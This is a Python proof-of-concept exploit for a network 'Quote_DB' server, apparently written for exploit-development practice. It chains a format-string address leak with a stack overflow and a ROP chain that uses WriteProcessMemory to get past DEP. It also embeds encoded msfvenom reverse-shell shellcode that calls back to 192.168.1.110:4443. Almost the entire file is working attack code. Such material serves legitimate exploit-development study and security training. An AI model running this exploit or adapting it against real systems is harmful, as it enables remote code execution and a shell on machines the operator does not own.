#!/usr/bin/python3

# Quote_DB PoC
# William Moody, 07.06.2021

from functools import update_wrapper
import socket
import sys
from struct import pack, unpack

if len(sys.argv) != 2:
    print("Usage: %s server" % sys.argv[0])
    sys.exit(1)

server = sys.argv[1]
port = 3700

# ===

def send(opcode, data):
    buf  = pack("<I", opcode)
    buf += data

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, port))
    s.send(buf)
    
    try:
        ret = s.recv(16384)
        s.close()

        return ret
    except:
        return None

# ===

def get_quote(index):
    return send(901, pack("<I", index))

def add_quote(quote):
    return send(902, quote)

def bad_request(buf):
    return send(800, buf)

# ===

print("[+] Getting base address...")

quote_id = unpack("<I", add_quote(b"%x " * 30))[0]
base_str = get_quote(quote_id).split(b" ")[2].decode()
base = (int(base_str, 16) // 0x10000) * 0x10000

print("    -- " + hex(base))

# ===

size = 5000
ropSize = 1000

# ===

# Bad Characters: "\x00\x0a\x20\x80\x81\x86"
# Custom Encode Mapping:
# \x00 -> \xff

# Non Encoded Reverse Shell
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.110 LPORT=4443 -f python -v shellcode
shellcode =  b""
shellcode += b"\x90" * 20
shellcode += b"\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2"
shellcode += b"\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x0f"
shellcode += b"\xb7\x4a\x26\x31\xff\x8b\x72\x28\x31\xc0\xac"
shellcode += b"\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
shellcode += b"\x49\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c"
shellcode += b"\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4c\x01\xd0"
shellcode += b"\x8b\x58\x20\x01\xd3\x8b\x48\x18\x50\x85\xc9"
shellcode += b"\x74\x3c\x49\x31\xff\x8b\x34\x8b\x01\xd6\x31"
shellcode += b"\xc0\xc1\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4"
shellcode += b"\x03\x7d\xf8\x3b\x7d\x24\x75\xe0\x58\x8b\x58"
shellcode += b"\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01"
shellcode += b"\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b"
shellcode += b"\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b"
shellcode += b"\x12\xe9\x80\xff\xff\xff\x5d\x68\x33\x32\x00"
shellcode += b"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26"
shellcode += b"\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29"
shellcode += b"\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a"
shellcode += b"\x0a\x68\xc0\xa8\x01\x6e\x68\x02\x00\x11\x5b"
shellcode += b"\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68"
shellcode += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57"
shellcode += b"\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a"
shellcode += b"\xff\x4e\x08\x75\xec\xe8\x67\x00\x00\x00\x6a"
shellcode += b"\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff"
shellcode += b"\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68"
shellcode += b"\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53"
shellcode += b"\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68"
shellcode += b"\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28"
shellcode += b"\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b"
shellcode += b"\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61"
shellcode += b"\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff"
shellcode += b"\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6"
shellcode += b"\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53"
shellcode += b"\xff\xd5"

def mapBadChars(shellcode):
    BADCHARS = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
    i = 0
    badIndex = []
    while i < len(shellcode):
        for c in BADCHARS:
            if shellcode[i] == c:
                badIndex.append(i)
        i=i+1
    return badIndex


def encodeShellcode(shellcode):
    BADCHARS     = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
    REPLACECHARS = b"\xff\x10\x06\x07\x08\x05\x1f"
    encodedShell = shellcode
    for i in range(len(BADCHARS)):
        encodedShell = encodedShell.replace(pack("B", BADCHARS[i]), pack("B", REPLACECHARS[i]))
    return encodedShell


pos = mapBadChars(shellcode)
encodedShellcode = encodeShellcode(shellcode)

def decodeShellcode(pos, shellcode):
    BADCHARS   = b"\x00\x09\x0a\x0b\x0c\x0d\x20"
    CHARSTOADD = b"\x01\xf9\x04\x04\x04\x08\x01"
    restoreRop = b""

    last_pos = 0    # Start from beginning

    for i in range(len(pos)):
        current_pos = pos[i]
        offset = pos[i] - last_pos
        last_pos = pos[i]
        #neg_offset = (-offset) & 0xffffffff

        value = 0
        for j in range(len(BADCHARS)):
            if shellcode[pos[i]] == BADCHARS[j]:
                value = CHARSTOADD[j]
        value = (value << 8) | 0x11110011    # ______bhbl

        # Shellcode is in EDX
        restoreRop += pack("<I", 0x4040f3)   # pop ecx ; ret
        restoreRop += pack("<I", offset)
        restoreRop += pack("<I", 0x401ff3)   # add edx, ecx ; ret
        restoreRop += pack("<I", 0x402ce8)   # mov eax, edx ; ret
        restoreRop += pack("<I", 0x402193)   # pop ebx ; ret
        restoreRop += pack("<I", value)      # values in BH
        restoreRop += pack("<I", 0x405ca4)   # add byte [eax], bh ; ret 
        restoreRop += pack("<I", 0x40eb7d)   # mov edx, eax ; mov eax, edx ; ret
    return restoreRop

rop_wpm = [
# 1. Get ESP (in eax)
    0x402ac9,       # xor eax, eax ; ret
                    # Sets EAX to 0

    0x401fd6,       # or eax, esp ; ret
                    # Sets EAX to the value of ESP

                    # Results: EAX contains the value of stack pointer (ESP)

# 2. Get dummy call addr (in ebx)
    0x4040f3,       # pop ecx ; ret
                    # EAX has the value of saved ESP.
    0x4d0,          # EAX(ESP) + 0x1ec = skeleton value 'aaaa'
                    # 'aaaa' = 0x010d78cc  (0x61616161)


    0x40eb7d,       # mov edx, eax ; mov edx, eax ; ret
                    # Moves EAX(ESP) to EDX.
                    # Reason: To add ECX to EDX to manipulate saved ESP

    0x401ff3,       # add edx, ecx ; ret
    0x402ce8,       # mov eax, edx
                    # Return saved ESP in EDX to EAX

    0x401fe0,       # mov ebx, eax ; ret
                    # Saved ESP is now in EBX also.

# 3. Deref WriteProcessMemory (in eax)
    0x4030d7,       # pop eax ; pop ecx ; ret
                    # Place WriteProcessMemory into EAX
    0x0044a1fc,       # base + iat + WriteProcessMemory = 0x77932510 KERNEL32!WriteProcessMemoryStub
    0xffffffff,     # junk for pop ecx

    0x410515,       # mov eax, [eax] ; ret
                    # Derefernces the address in EAX to get the actual function pointer
                    # of WriteProcessMemory.

                    # Before instruction: EAX contains 0x0044a1e8
                    # During instruction: CPU reads the value within 0x0044a1e8
                    # After  instruction: The value 0x75ac81b0 (KERNEL32!WriteProcessMemoryStub)
                    #                     is moved into the EAX register.

# 4. 0x61616161 Write WriteProcessMemory to dummy + 0x0
    0x401fe7,       # mov [ebx], eax ; ret
                    # Move WriteProcessMemory Pointer into EBX. (Skeleton location 0x61616161)

# 5. Get shellcode addr (in eax)
    0x4040f3,       # pop ecx ; ret
    0x1c,           # hex(28)

    0x401ff3,       # add edx, ecx ; ret
                    # Adds 0x18 to EDX (which contains original skeleton call)
                    # EDX now points to shellcode address parameter

    0x402ce8,       # mov eax, edx
                    # EDX moves shellcode address parameter address to EAX

                    # Result: EAX contains the address of the shellcode
                    #         EBX points to skeleton call address. (0x61616161 = 0x75ac81b0)

# 6. 0x64646464 Get dummy call addr + 0x10 (in ebx)
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
                    # Results: EBX is on skeleton call + 0x10 (0x64646464)
                    #          Skipped 12 bytes because:
                    #          Ret Shellcode is done
                    #          hProcess is done (0xffffffff)
                    #          lpBaseAddress is done (0x00491d10)
                    #          (NO ASLR in main_dep_wpm.exe module)

# 7. Get dummy call addr + 0x10 (in ebx)
    0x401fe7,       # mov [ebx], eax
                    # 0x011678e8 Shellcode Stack Address (src)


# 8. 0x64646464 Get skeleton call addr + 0x14
    0x401fef,       # add ebx, 0x4 ; ret
    0x401fef,       # add ebx, 0x4 ; ret
                    # Results: EBX is on skeleton call + 0x14 (0x66666666)


                    # All Skeleton values completed
                    # End   of ROP 1
                    # Start of ROP 2
                    # ROP 2 will encode the shellcode to replace bad characters
                    # bad characters: 0x00 0x0a 0x20 0x28 0x80 0x81 0x86

]
rop_wpm = b"".join([pack("<I", r) for r in rop_wpm])

rop_decode = decodeShellcode(pos, shellcode)

rop_align = [
# #. Align esp with dummy call (ebx-8)
    0x4040f3,       # pop ecx
    0xfffffe80,     # 0xffffffe4    = -0x1c (-28)
    0x401ff3,       # add edx, ecx  = edx - 0x24
    0x402ce8,       # mov eax, edx
    0x401fe0,       # mov ebx, eax
    0x4010f1,       # ret

                    # Results: Return SAVED ESP from EAX to CURRENT ESP

]
rop_align = b"".join([pack("<I", r) for r in rop_align])

dummy  = b"aaaa"                # WriteProcessMemory     <- The Call
dummy += pack("<I", 0x00410640) # Ret                    <- Ret2Code_Cave
dummy += pack("<I", 0xffffffff) # hProcess               <- (-0x1 Current Process)
dummy += pack("<I", 0x00410640) # lpBaseAddress          <- Code Cave Address (dst)
dummy += b"dddd"                # lpBuffer               <- Shellcode (STACK) (src)
dummy += pack("<I", 0x190)      # nSize                  <- Size of Shellcode
dummy += pack("<I", 0x00423010) # lpNumberofBytesWritten <- Some writable address


buf  = b"A" * 2060
buf += rop_wpm                  # Setup WriteProcessMemory paramters
buf += rop_decode               # While Shellcode in EAX, Decode Shellcode
buf += rop_align                # Align ESP to dummy call
buf += b"C" * (ropSize - len(rop_wpm) - len(rop_decode) - len(rop_align))
buf += dummy
buf += encodedShellcode 


print("[+] Triggering overflow...")

bad_request(buf)
